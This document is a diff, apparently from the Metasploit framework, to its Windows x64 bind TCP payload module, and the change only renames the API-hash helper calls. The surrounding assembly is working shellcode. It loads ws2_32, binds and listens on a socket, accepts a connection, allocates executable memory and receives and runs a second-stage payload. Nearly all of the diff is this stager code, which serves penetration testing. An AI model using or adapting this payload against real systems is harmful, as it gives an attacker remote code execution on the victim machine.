@@ -143,14 +143,14 @@ module Payload::Windows::BindTcp_x64
 
         ; perform the call to LoadLibraryA...
         mov rcx, r14           ; set the param for the library to load
-        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
+        mov r10d, #{block_api_hash('kernel32.dll', 'LoadLibraryA')}
         call rbp               ; LoadLibraryA( "ws2_32" )
 
         ; perform the call to WSAStartup...
         mov rdx, r13           ; second param is a pointer to this struct
         push 0x0101            ;
         pop rcx                ; set the param for the version requested
-        mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'WSAStartup')}
+        mov r10d, #{block_api_hash('ws2_32.dll', 'WSAStartup')}
         call rbp               ; WSAStartup( 0x0101, &WSAData );
 
         ; perform the call to WSASocketA...
@@ -162,7 +162,7 @@ module Payload::Windows::BindTcp_x64
         xor r8, r8             ; we do not specify a protocol
         inc rax                ;
         mov rdx, rax           ; push SOCK_STREAM
-        mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'WSASocketA')}
+        mov r10d, #{block_api_hash('ws2_32.dll', 'WSASocketA')}
         call rbp               ; WSASocketA( AF_INET/6, SOCK_STREAM, 0, 0, 0, 0 );
         mov rdi, rax           ; save the socket for later
 
@@ -172,26 +172,26 @@ module Payload::Windows::BindTcp_x64
                                ; first 8 bytes as the rest aren't used)
         mov rdx, r12           ; set the pointer to sockaddr_in struct
         mov rcx, rdi           ; socket
-        mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'bind')}
+        mov r10d, #{block_api_hash('ws2_32.dll', 'bind')}
         call rbp               ; bind( s, &sockaddr_in, #{sockaddr_size} );
 
         ; perform the call to listen...
         xor rdx, rdx           ; backlog
         mov rcx, rdi           ; socket
-        mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'listen')}
+        mov r10d, #{block_api_hash('ws2_32.dll', 'listen')}
         call rbp               ; listen( s, 0 );
 
         ; perform the call to accept...
         xor r8, r8             ; we set length for the sockaddr struct to zero
         xor rdx, rdx           ; we dont set the optional sockaddr param
         mov rcx, rdi           ; listening socket
-        mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'accept')}
+        mov r10d, #{block_api_hash('ws2_32.dll', 'accept')}
         call rbp               ; accept( s, 0, 0 );
 
         ; perform the call to closesocket...
         mov rcx, rdi           ; the listening socket to close
         mov rdi, rax           ; swap the new connected socket over the listening socket
-        mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'closesocket')}
+        mov r10d, #{block_api_hash('ws2_32.dll', 'closesocket')}
         call rbp               ; closesocket( s );
 
         ; restore RSP so we dont have any alignment issues with the next block...
@@ -213,7 +213,7 @@ module Payload::Windows::BindTcp_x64
         push 4                 ;
         pop r8                 ; length = sizeof( DWORD );
         mov rcx, rdi           ; the saved socket
-        mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'recv')}
+        mov r10d, #{block_api_hash('ws2_32.dll', 'recv')}
         call rbp               ; recv( s, &dwLength, 4, 0 );
         add rsp, 32            ; we restore RSP from the api_call so we can pop off RSI next
 
@@ -226,7 +226,7 @@ module Payload::Windows::BindTcp_x64
         pop r8                 ; MEM_COMMIT
         mov rdx, rsi           ; the newly received second stage length.
         xor rcx, rcx           ; NULL as we dont care where the allocation is.
-        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
+        mov r10d, #{block_api_hash('kernel32.dll', 'VirtualAlloc')}
         call rbp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
 
         ; Receive the second stage and execute it...
@@ -238,7 +238,7 @@ module Payload::Windows::BindTcp_x64
         mov r8, rsi            ; length
         mov rdx, rbx           ; the current address into our second stages RWX buffer
         mov rcx, rdi           ; the saved socket
-        mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'recv')}
+        mov r10d, #{block_api_hash('ws2_32.dll', 'recv')}
         call rbp               ; recv( s, buffer, length, 0 );
 
         add rbx, rax           ; buffer += bytes_received
